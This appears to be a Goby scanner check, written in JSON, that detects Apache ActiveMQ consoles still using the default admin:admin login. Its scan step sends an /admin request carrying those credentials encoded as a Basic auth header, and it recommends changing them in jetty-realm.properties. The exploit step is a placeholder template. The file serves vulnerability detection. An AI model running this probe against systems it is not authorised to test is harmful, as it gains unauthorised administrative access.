{
      "Name": "Apache ActiveMQ default admin account",
      "Level": "2",
      "Tags": [
            "defaultaccount"
      ],
      "GobyQuery": "app=\"Apache-ActiveMQ\"",
      "Description": "Apache ActiveMQ® is the most popular open source, multi-protocol, Java-based message broker. It supports industry standard protocols so users get the benefits of client choices across a broad range of languages and platforms. Connect from clients written in JavaScript, C, C++, Python, .Net, and more. Integrate your multi-platform applications using the ubiquitous AMQP protocol. Exchange messages between your web applications using STOMP over websockets. Manage your IoT devices using MQTT. Support your existing JMS infrastructure and beyond. ActiveMQ offers the power and flexibility to support any messaging use-case.",
      "Product": "Apache ActiveMQ",
      "Homepage": "https://activemq.apache.org/",
      "Author": "",
      "Impact": "It's possible to access the Apache ActiveMQ Administration Console by using the default credentials. The default administration user name and password for the Apache ActiveMQ Administration Console is admin and admin respectively.",
      "Recommendation": "Change the default administrative username and password of Apache ActiveMQ by editing the file apache-activemq-x.x.x/conf/jetty-realm.properties.",
      "References": [],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/admin",
                        "follow_redirect": true,
                        "header": {
                              "Authorization": "Basic YWRtaW46YWRtaW4="
                        },
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Version",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}